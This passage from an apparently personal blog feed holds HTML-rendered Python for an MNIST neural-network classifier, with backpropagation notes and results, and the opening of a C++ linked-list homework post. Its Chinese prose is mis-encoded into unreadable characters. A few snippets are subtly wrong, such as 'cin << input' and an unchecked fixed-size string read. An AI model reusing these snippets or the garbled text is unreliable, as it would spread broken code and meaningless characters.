class="line">        self.Z.append(AddBias(self.A[-<span class="number">1</span>]) * np.multiply(self.w[-<span class="number">1</span>], self.dropOut[-<span class="number">1</span>]))</span><br><span class="line">        self.A.append(softMax(self.Z[-<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ClrTempResult</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.Z = self.Z[<span class="number">0</span>:<span class="number">1</span>]</span><br><span class="line">        self.A = self.A[<span class="number">0</span>:<span class="number">1</span>]</span><br><span class="line">        self.dw = <span class="built_in">list</span>(np.repeat(<span class="number">1</span>, self.layerNum, axis=<span class="number">0</span>))</span><br><span class="line">        self.dZ = <span class="built_in">list</span>(np.repeat(<span class="number">1</span>, self.layerNum, axis=<span class="number">0</span>))</span><br><span class="line">        self.dA = <span class="built_in">list</span>(np.repeat(<span class="number">1</span>, self.layerNum, axis=<span class="number">0</span>))</span><br><span class="line">        self.dropOut = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">predict</span>(<span class="params">self, X, y</span>):</span></span><br><span class="line">        self.ClrTempResult()</span><br><span class="line">        self.dropOutProb = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.layerNum - <span class="number">1</span>)]</span><br><span class="line">        self.Z[<span class="number">0</span>] = np.matrix(X)</span><br><span class="line">        self.A[<span class="number">0</span>] = np.matrix(X)</span><br><span class="line">        self.forwardProp()</span><br><span class="line">        r_p = self.A[-<span class="number">1</span>]</span><br><span class="line">        self.r = np.zeros((r_p.shape[<span class="number">0</span>], <span class="number">1</span>))</span><br><span class="line">        correct = <span class="number">0</span></span><br><span class="line">        self.wrong = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r_p.shape[<span class="number">0</span>]):</span><br><span class="line">            self.r[i] = np.argmax(r_p[i])</span><br><span class="line">            <span class="keyword">if</span> self.r[i] == np.array(y).ravel()[i]:</span><br><span class="line">                correct += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.wrong.append(i) <span class="comment"># å‚¨å­˜é”™è¯¯æ ·æœ¬çš„index</span></span><br><span class="line">        print(<span class="string">&quot;correct: &quot;</span> + <span class="built_in">str</span>(correct / r_p.shape[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">SaveParameters</span>(<span class="params">self</span>):</span></span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;FCNNweight.dat&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">        wt = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> self.w[<span class="number">1</span>:]:</span><br><span class="line">            wt.extend(<span class="built_in">list</span>(np.array(i).ravel()))</span><br><span class="line">        f.write(np.array(wt).tobytes())</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">LoadParameters</span>(<span class="params">self</span>):</span></span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;FCNNweight.dat&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">        wt = np.frombuffer(f.read(), np.float64)</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(self.unitNum)):</span><br><span class="line">            self.w[i] = np.matrix(wt[: (self.unitNum[i - <span class="number">1</span>] + <span class="number">1</span>) * self.unitNum[i]]).reshape((self.unitNum[i - <span class="number">1</span>] + <span class="number">1</span>, self.unitNum[i]))</span><br><span class="line">            wt = wt[(self.unitNum[i - <span class="number">1</span>] + <span class="number">1</span>) * self.unitNum[i] :]</span><br></pre></td></tr></table></figure>    </div></div><h3 id="åå‘ä¼ æ’­æ¨å¯¼"><a href="#åå‘ä¼ æ’­æ¨å¯¼" class="headerlink" title="åå‘ä¼ æ’­æ¨å¯¼"></a>åå‘ä¼ æ’­æ¨å¯¼</h3><p>ä»¥ä¸‹ä¸ºæˆ‘æ¢³ç†ä»£ç çš„æ—¶å€™é¡ºä¾¿å†™çš„è¿‡ç¨‹</p><p>é“¾å¼æ³•åˆ™æ¨å•ä¸ªç¥ç»å…ƒï¼Œç„¶åæ‰©å±•åˆ°çŸ©é˜µ</p><p>å¼ºçƒˆå»ºè®®æ­é…3b1bç³»åˆ—part4ï¼ˆæˆ–è€…æ˜¯part3[ä¸‹]ï¼Ÿï¼‰é£Ÿç”¨ï¼Œé™„ä¸Šä¸€å¼ 3b1bè§†é¢‘çš„æˆªå›¾</p><img src="/images/FCNN_formula.png"/><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">layerNum = <span class="number">4</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"> input -&gt; hidden 1 -&gt; hidden 2 -&gt; output</span></span><br><span class="line"><span class="string"> 784+1 -&gt;   H1+1   -&gt;   H2+1   -&gt;   10</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> Z0(X)  â”Œâ”€â”€â”€&gt;Z1     â”Œâ”€â”€â”€&gt;Z2     â”Œâ”€â”€&gt;Z3</span></span><br><span class="line"><span class="string">   â”‚    â”‚     â†“     â”‚     â†“     â”‚    â†“</span></span><br><span class="line"><span class="string">   â”‚  [w1] [relu] [w2] [relu] [w3][softmax]</span></span><br><span class="line"><span class="string">   â†“    â”‚     â†“     â”‚     â†“     â”‚    â†“</span></span><br><span class="line"><span class="string"> A0(X)â”€â”€â”˜    A1â”€â”€â”€â”€â”€â”˜    A2â”€â”€â”€â”€â”€â”˜   A3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">unityNum = [<span class="number">784</span>, H1, H2, <span class="number">10</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">### Init ###</span></span><br><span class="line">w = [ <span class="number">0</span>, [w1(<span class="number">784</span>+<span class="number">1</span>,H1)], [w2(H1+<span class="number">1</span>,H2)], [w3(H2+<span class="number">1</span>,<span class="number">10</span>)] ]</span><br><span class="line">Z = [ [X(N,<span class="number">784</span>)] ]</span><br><span class="line"><span class="comment"># A has same structure as Z</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### forwardProp ###</span></span><br><span class="line">Z = [ [X(N,<span class="number">784</span>)], [Z1(N,H1)], [Z2(N,H2)], [Z3(N,<span class="number">10</span>)] ]</span><br><span class="line"><span class="comment"># A has same structure as Z</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### backProp ###</span></span><br><span class="line"><span class="comment"># dX means Î´J/Î´X</span></span><br><span class="line"><span class="comment"># aka partial derivative of parameter X with respect to cost function J</span></span><br><span class="line"><span class="comment"># to get formulas as below, apply chain rule</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># u[i] indicates i.th layer of neural network</span></span><br><span class="line"><span class="string"># and each layer has only 1 neuron</span></span><br><span class="line"><span class="string"># L.th layer indicates output layer</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    ....    &#123;u[L-1]&#125;â”€â”€â”€â”€&#123;u[L]&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Deduction (lossFunc: CrossEntropy):</span></span><br><span class="line"><span class="string">- layer L :</span></span><br><span class="line"><span class="string">    dA[L] = Î´J/Î´A[L] = A[L] - y</span></span><br><span class="line"><span class="string">    dZ[L] = Î´A[L]/Î´Z[L] * dA[L] = sigmoidDeriv(Z[L]) * dA[L]</span></span><br><span class="line"><span class="string">    dw[L] = Î´w[L]/Î´Z[L] * dZ[L] = A[L-1] * dZ[L]</span></span><br><span class="line"><span class="string">    db[L] = Î´b[L]/Î´Z[L] * dZ[L] = dZ[L]</span></span><br><span class="line"><span class="string">- layer L-1 :</span></span><br><span class="line"><span class="string">    dA[L-1] = Î´Z[L]/Î´A[L-1] * dZ[L] = w[L] * dZ[L]</span></span><br><span class="line"><span class="string">    dZ[L-1] = Î´A[L-1]/Î´Z[L-1] * dA[L-1] = reluDeriv(Z[L-1]) * dA[L-1]</span></span><br><span class="line"><span class="string">    ... etc.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># extra process making formulas can be applied to matrices or layers</span></span><br><span class="line"><span class="comment"># no dot product is applied below, just multiplying elements by elements</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># when each layer has more than 1 neuron</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &#123;u[L-1][0]&#125;</span></span><br><span class="line"><span class="string">                         â”Œâ”€&#123;u[L][0]&#125;</span></span><br><span class="line"><span class="string">    ....    &#123;u[L-1][1]&#125;â•â•â•¡</span></span><br><span class="line"><span class="string">                         â””â”€&#123;u[L][1]&#125;</span></span><br><span class="line"><span class="string">            &#123;u[L-1][2]&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># for a certain neuron in hidden layer, e.g. as for u[L-1][1]</span></span><br><span class="line"><span class="string"># w[L][1][0] indicates weight between &#123;u[L-1][1]&#125; and &#123;u[L][0]&#125;</span></span><br><span class="line"><span class="string"># Deduction :</span></span><br><span class="line"><span class="string">- layer L :</span></span><br><span class="line"><span class="string">    dA[L][0] = A[L][0] - y[0]</span></span><br><span class="line"><span class="string">    dA[L][1] = A[L][1] - y[1]</span></span><br><span class="line"><span class="string">    dZ[L][0] = sigmoidDeriv(Z[L][0]) * dA[L][0]</span></span><br><span class="line"><span class="string">    dZ[L][1] = sigmoidDeriv(Z[L][1]) * dA[L][1]</span></span><br><span class="line"><span class="string">    dw[L][1][0] = A[L-1][1] * dZ[L][0]</span></span><br><span class="line"><span class="string">    dw[L][1][1] = A[L-1][1] * dZ[L][1]</span></span><br><span class="line"><span class="string">    db[L][1][0] = dZ[L][0]</span></span><br><span class="line"><span class="string">    db[L][1][1] = dZ[L][1]</span></span><br><span class="line"><span class="string">- layer L-1 :</span></span><br><span class="line"><span class="string">    dA[L-1][1] = w[L][1][0] * dZ[L][0] + w[L][1][1] * dZ[L][1]</span></span><br><span class="line"><span class="string">    dZ[L-1][1] = reluDeriv(Z[L-1][1]) * dA[L-1][1]</span></span><br><span class="line"><span class="string">    ... etc</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># e.g. as for 3.rd layer, which has index of 2 :</span></span><br><span class="line"><span class="string">    dA2(N,H2) = RemoveBias(dZ3(N,10) * w3.T(10,H2+1))</span></span><br><span class="line"><span class="string">    dZ2(N,H2) = np.multiply(reluDeriv(Z2)(N,H2),dA2(N,H2))</span></span><br><span class="line"><span class="string">    dw2(H1,H2) = A1.T(H1,N) * dZ2(N,H2)</span></span><br><span class="line"><span class="string">    db2(1,H2) = np.sum(dZ2(N,H2),axis=0)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">dA = [ <span class="number">1</span>, [dA1(N,H1)], [dA2(N,H2)], [dA3(N,<span class="number">10</span>)] ]</span><br><span class="line">dw = [ <span class="number">1</span>, [dw0(<span class="number">784</span>+<span class="number">1</span>,H1)], [dw1(H1+<span class="number">1</span>,H2)], [dw2(H2+<span class="number">1</span>,<span class="number">10</span>)] ]</span><br></pre></td></tr></table></figure><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">unitNum = [<span class="number">784</span>, <span class="number">512</span>, <span class="number">256</span>, <span class="number">10</span>]</span><br><span class="line">dropOutProb = [<span class="number">0.4</span>, <span class="number">0.2</span>, <span class="number">0.1</span>]</span><br><span class="line">batchSize = <span class="number">120</span></span><br><span class="line">epoch = <span class="number">50</span></span><br><span class="line">rate = <span class="number">0.08</span></span><br><span class="line"></span><br><span class="line">FCNN = FCNN()</span><br><span class="line">FCNN.Init(unitNum, dropOutProb)</span><br><span class="line">FCNN.PrepareBatch(trainX, trainy, batchSize)</span><br><span class="line">FCNN.fit(epoch, rate)</span><br><span class="line">FCNN.SaveParameters()</span><br></pre></td></tr></table></figure><h3 id="åç»­éªŒè¯"><a href="#åç»­éªŒè¯" class="headerlink" title="åç»­éªŒè¯"></a>åç»­éªŒè¯</h3><p>åœ¨è®­ç»ƒå®Œåªä¼šåº”å½“ç»˜åˆ¶<code>loss</code>å›¾åƒï¼Œç”¨äºç¡®ä¿æ¢¯åº¦ä¸‹é™æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼ˆ<code>dw</code>æ¨¡é•¿å•çº¯æ˜¯æˆ‘æƒ³çœ‹ä¸€ä¸‹è€Œå·²ï¼‰</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        Source    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ShowCostFig</span>(<span class="params">epoch, cost</span>):</span></span><br><span class="line">    <span class="comment"># ç»˜åˆ¶æŸå¤±å‡½æ•°åœ¨è¿­ä»£ä¸­çš„å˜åŒ–å›¾åƒ</span></span><br><span class="line">    ax = plt.figure().gca()</span><br><span class="line">    ax.xaxis.set_major_locator(MaxNLocator(integer=<span class="literal">True</span>))  <span class="comment"># ä½¿åæ ‡åˆ»åº¦ä¸ºæ•´æ•°</span></span><br><span class="line">    plt.plot(<span class="built_in">range</span>(<span class="number">0</span>, epoch), cost[<span class="number">0</span>:], <span class="string">&quot;go-&quot;</span>)</span><br><span class="line">    plt.show()</span><br><span class="line">    print(<span class="string">&quot;Final Cost: &quot;</span> + <span class="built_in">str</span>(cost[epoch - <span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ShowdwFig</span>(<span class="params">epoch, dw, layerNum</span>):</span></span><br><span class="line">    <span class="comment"># ç»˜åˆ¶dwçš„L2åœ¨è¿­ä»£ä¸­çš„å˜åŒ–å›¾åƒ</span></span><br><span class="line">    camp = getCmap(layerNum)</span><br><span class="line">    ax = plt.figure(figsize=(<span class="number">15</span>, <span class="number">5</span>)).gca()</span><br><span class="line">    ax.xaxis.set_major_locator(MaxNLocator(integer=<span class="literal">True</span>))</span><br><span class="line">    <span class="keyword">for</span> i, data <span class="keyword">in</span> <span class="built_in">enumerate</span>(np.transpose(dw)):</span><br><span class="line">        plt.plot(data[<span class="number">1</span>:], c=camp(i), label=i)</span><br><span class="line">    plt.legend()  <span class="comment"># åŠ ä¸Šå›¾ä¾‹</span></span><br><span class="line">    plt.show()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCmap</span>(<span class="params">n, name=<span class="string">&quot;hsv&quot;</span></span>):</span></span><br><span class="line">    <span class="comment"># ä»ç½‘ä¸Šcopyäº†ä¸€ä¸ªè°ƒè‰²ç›˜æ¥é€‰é¢œè‰²</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns a function that maps each index in 0, 1, ..., n-1 to a distinct</span></span><br><span class="line"><span class="string">    RGB color; the keyword argument name must be a standard mpl colormap name.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> plt.cm.get_cmap(name, n)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ShowNorm</span>(<span class="params">x</span>):</span></span><br><span class="line">    print(<span class="string">&quot;Norm: &quot;</span> + <span class="built_in">str</span>(np.linalg.norm(x)))</span><br></pre></td></tr></table></figure>    </div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">FCNN.predict(trainX, trainy)</span><br><span class="line">&gt;&gt; correct: <span class="number">0.9768571428571429</span></span><br><span class="line">FCNN.predict(testX, testy)</span><br><span class="line">&gt;&gt; correct: <span class="number">0.9675</span></span><br><span class="line">ShowNorm(FCNN.w[-<span class="number">1</span>])</span><br><span class="line">&gt;&gt; Norm: <span class="number">4.553835257428929</span></span><br><span class="line">ShowCostFig(epoch, FCNN.cost)</span><br><span class="line">&gt;&gt; Final Cost: <span class="number">0.2906157343621473</span></span><br><span class="line">ShowdwFig(epoch, FCNN.dwNorm, FCNN.layerNum)</span><br></pre></td></tr></table></figure><img src="/images/FCNN_costFig.png"/><img src="/images/FCNN_dwFig.png"/><p>å¯è§<code>loss</code>çš„ç¡®åœ¨ä»¥è‚‰çœ¼å¯è§é€Ÿåº¦æ”¶æ•›ï¼Œä¸”æ¨¡å‹å¯¹è®­ç»ƒé›†å’Œæµ‹è¯•é›†çš„é¢„æµ‹å‡†ç¡®åº¦ç›¸å·®ä¸å¤§ï¼Œéƒ½ä¿æŒåœ¨96%~97%ï¼Œå¯¹æˆ‘æ¥è¯´æˆ‘å·²ç»æ»¡æ„äº†</p><p>æœ€åå½“ç„¶æ˜¯å–œé—»ä¹è§çš„é”™è¯¯æ ·æœ¬æŠ½æ ·ï¼ˆåªèƒ½è¯´ç›¸å½“ä¸€éƒ¨åˆ†çš„é”™è¯¯æ ·æœ¬ä¹Ÿéƒ½ä¸æ˜¯ä»€ä¹ˆå–„èŒ¬</p><img src="/images/FCNN_wrong.png"/><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;p&gt;å…¨è¿æ¥ç¥ç»ç½‘ç»œè¯†åˆ«MNISTæ‰‹å†™æ•°å­—é›†ï¼ŒAIä¸­çš„HelloWorld&lt;/p&gt;
&lt;img src=&quot;/images/FCNN_cover.png&quot;/&gt;</summary>
    
    
    
    <category term="AI" scheme="https://kyriota.github.io/categories/AI/"/>
    
    
  </entry>
  
  <entry>
    <title>æ•°æ®ç»“æ„å¤§ä½œä¸š</title>
    <link href="https://kyriota.github.io/2022/01/05/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%A7%E4%BD%9C%E4%B8%9A/"/>
    <id>https://kyriota.github.io/2022/01/05/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%A7%E4%BD%9C%E4%B8%9A/</id>
    <published>2022-01-05T06:30:40.000Z</published>
    <updated>2022-01-13T08:26:30.063Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸€æ—©ä¸Šå°±èƒ½å†™å®Œï¼Œæœ‰éœ€è¦çš„è‡ªå·±æ‹¿å»æ”¹ï¼Œä¸è¦å®Œå…¨æ¬å°±è¡Œ</p><span id="more"></span><!--toc--><h1 id="æ•°æ®ç»“æ„å¤§ä½œä¸š"><a href="#æ•°æ®ç»“æ„å¤§ä½œä¸š" class="headerlink" title="æ•°æ®ç»“æ„å¤§ä½œä¸š"></a>æ•°æ®ç»“æ„å¤§ä½œä¸š</h1><p>ä¸€å¼€å§‹å‡†å¤‡å»ç½‘ä¸Šéšä¾¿æ‰¾ä¸€ä¸ªäº¤å·®çš„ï¼Œå°±ï¼Œå¤åˆ¶ä¸‹æ¥ï¼Œç„¶åæ”¹æ”¹ï¼Œç„¶åå‘ç°èƒ½çœ‹çš„ä¹Ÿå°±é‚£å‡ ä¸ªï¼Œä»£ç å¤ªå¤šï¼Œç­‰æˆ‘æ”¹å®Œäº†è‡ªå·±éƒ½å†™å®Œäº†ï¼Œäºæ˜¯å°±è‡ªå·±å†™äº†</p><p>ç„¶åå†™çš„æ—¶å€™ä¸€å¼€å§‹å‡†å¤‡Cè¯­è¨€çš„ï¼Œä½†æ˜¯åé¢å‘ç°è¦ç”¨ä¸€äº›C++çš„ç‰¹æ€§ï¼Œæ¯”å¦‚è¿™è€å¸ˆè¦æ±‚ä»æ–‡ä»¶è¾“å…¥å’Œè¾“å‡ºï¼ŒC++çš„é‡å®šå‘å°±å¾ˆæ–¹ä¾¿ï¼Œè¿˜æœ‰æ¯”å¦‚<code>setw()</code>å¯¹æ’ç‰ˆæ¯”è¾ƒå‹å¥½</p><p>Since I discovered the new world of AI and cellular automata, Iâ€™m not gonna waste much time on this garbage, and Iâ€™ll focus on deep learning after this in preparation for exploring the new world</p><h2 id="Feature"><a href="#Feature" class="headerlink" title="Feature"></a>Feature</h2><ul><li><p>æ§åˆ¶å°ç¨‹åº</p></li><li><p>é“¾è¡¨å‚¨å­˜çš„æ•°æ®</p></li><li><p>ä»æ–‡ä»¶è¾“å…¥ä¸è¾“å‡º</p><ul><li><p>å½“ç›®å½•ä¸­å­˜åœ¨input.txtçš„æ—¶å€™ï¼Œä»input.txtä¸­è¯»å–è¾“å…¥ï¼Œå¹¶æŠŠè¾“å‡ºå­˜å…¥output.txt</p></li><li><p>ä¸å­˜åœ¨æ—¶åˆ™æ˜¯å¸¸è§„çš„é”®ç›˜è¾“å…¥</p></li></ul></li><li><p>å¯è¯»å†™çš„ç¡¬ç›˜æ•°æ®å­˜å‚¨</p><ul><li>å¤§æ¦‚å°±æ˜¯èƒ½å¤Ÿåœ¨æ‰“å¼€çš„æ—¶å€™åŠ è½½data.txté‡Œé¢çš„æ•°æ®åˆ°å†…å­˜</li><li>ç„¶åé€€å‡ºçš„æ—¶å€™èƒ½å¤ŸæŠŠå†…å­˜é‡Œçš„æ•°æ®å­˜å›åˆ°data.txt</li></ul></li></ul><p>å¤§æ¦‚æœ‰è¿™äº›åŠŸèƒ½ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">* Input From User</span><br><span class="line">* &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">* 1. Add New Book</span><br><span class="line">* 2. Edit Info</span><br><span class="line">* 3. Delete Book</span><br><span class="line">* 4. Search Book</span><br><span class="line">* 5. View All Books</span><br><span class="line">* 6. Save Data</span><br><span class="line">* 7. Save And Exit</span><br><span class="line">* &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&gt;&gt; Select a function : </span><br></pre></td></tr></table></figure><h2 id="Fun-Stuff"><a href="#Fun-Stuff" class="headerlink" title="Fun Stuff"></a>Fun Stuff</h2><p>è™½ç„¶è¿™ä¸œè¥¿æ˜¯å¾ˆç®€å•ï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯ç¨å¾®æŠŠé‡Œé¢ä¸€äº›å¥‡æ€ªçš„ï¼Œåœ¨å¿˜äº†çš„æƒ…å†µä¸‹è¦èŠ±è´¹ä¸€ç‚¹æ—¶é—´ç†è§£çš„ä¸œè¥¿è®°å½•ä¸€ä¸‹ï¼ˆè¿™ä¸€ç‚¹çœŸçš„å¾ˆé‡è¦ï¼Œæˆ‘ç°åœ¨å›å»çœ‹æˆ‘ä¹‹å‰åšçš„é€»è¾‘å›å½’çš„ä»£ç è¡¨ç¤ºå·²ç»å¿˜å¹²å‡€äº†æ­£åœ¨é‡æ–°å­¦ï¼‰</p><h3 id="é“¾è¡¨ç»“æ„"><a href="#é“¾è¡¨ç»“æ„" class="headerlink" title="é“¾è¡¨ç»“æ„"></a>é“¾è¡¨ç»“æ„</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> amount, nameLen, authorLen;</span><br><span class="line">    <span class="keyword">float</span> price;</span><br><span class="line">    <span class="keyword">char</span> *name, *author;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">last</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; * SLNode;</span><br></pre></td></tr></table></figure><p>å› ä¸ºè¡¨å¤´ä¸€èˆ¬éƒ½æ˜¯åªä½œä¸ºä¸€ä¸ªå¤´ï¼Œç„¶åæ‰¾ä¸œè¥¿éƒ½æ˜¯ä»<code>p = head-&gt;next</code>å¼€å§‹æ‰¾çš„ï¼Œä½†æ˜¯ä¸ºäº†æ–¹ä¾¿ï¼Œå¤´åˆå’Œåé¢çš„é“¾è¡¨æ˜¯ä¸€ä¸ªç»“æ„ï¼Œå¦‚æœä¸æŠŠç»™è¡¨å¤´åˆ†é…çš„ç©ºé—´åˆ©ç”¨èµ·æ¥å°±æœ‰ç‚¹äºï¼Œæ‰€ä»¥æˆ‘ä¸€èˆ¬å–œæ¬¢æŠŠè¡¨é•¿è®°å½•åœ¨è¡¨å¤´ï¼Œä¼šç¨å¾®æ–¹ä¾¿ä¸€äº›ï¼Œæ¯”å¦‚æ­¤å¤„æˆ‘å°±æŠŠ<code>head-&gt;amount</code>å½“ä½œæ˜¯é“¾è¡¨çš„è¡¨é•¿æ¥ç”¨</p><h3 id="å­—ç¬¦ä¸²çš„å­˜å‚¨"><a href="#å­—ç¬¦ä¸²çš„å­˜å‚¨" class="headerlink" title="å­—ç¬¦ä¸²çš„å­˜å‚¨"></a>å­—ç¬¦ä¸²çš„å­˜å‚¨</h3><p>åœ¨è¾“å…¥å­—ç¬¦ä¸²çš„æ—¶å€™ä¸€èˆ¬ä¼šé¢„ç•™è¶³å¤Ÿçš„ç©ºé—´æ¥ç­‰å¾…è¾“å…¥ï¼ˆæ ˆæº¢å‡ºï¼Ÿå…ˆä¸è€ƒè™‘ï¼Œæˆ‘ä¹Ÿä¸ç¡®å®š<code>cin</code>è¿™ç§æµè¾“å…¥æœ‰æ— æº¢å‡ºçš„é—®é¢˜ï¼‰</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> input[<span class="number">1024</span>];</span><br><span class="line"><span class="built_in">cin</span> &lt;&lt; input;</span><br></pre></td></tr></table></figure><p>ç­‰ç”¨æˆ·è¾“å…¥äº†å­—ç¬¦ä¸²çš„å†…å®¹ï¼Œè¿™æ®µå†…å®¹å°±åº”è¯¥ä»æ ˆä¸Šè½¬ç§»åˆ°å 